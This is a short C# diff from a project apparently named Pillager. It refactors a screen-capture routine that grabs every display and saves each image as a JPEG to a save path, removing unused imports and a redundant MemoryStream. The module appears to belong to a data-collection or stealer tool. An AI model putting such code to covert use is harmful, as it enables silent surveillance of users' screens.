@@ -1,13 +1,8 @@
-﻿using Pillager.Helper;
-using System;
-using System.Collections.Generic;
-using System.Drawing;
+﻿using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
-using System.Reflection;
-using System.Text;
 using System.Windows.Forms;
+using Pillager.Helper;
 
 namespace Pillager.Others
 {
@@ -37,10 +32,7 @@ namespace Pillager.Others
                             {
                                 graphics.CopyFromScreen(screen.Bounds.Left, screen.Bounds.Top, 0, 0, new Size(bitmap.Width, bitmap.Height), CopyPixelOperation.SourceCopy);
                             }
-                            using (MemoryStream memoryStream = new MemoryStream())
-                            {
-                                bitmap.Save(Path.Combine(savepath, OtherName + i + ".jpg"), ImageFormat.Jpeg);
-                            }
+                            bitmap.Save(Path.Combine(savepath, OtherName + i + ".jpg"), ImageFormat.Jpeg);
                         }
                     }
                 }
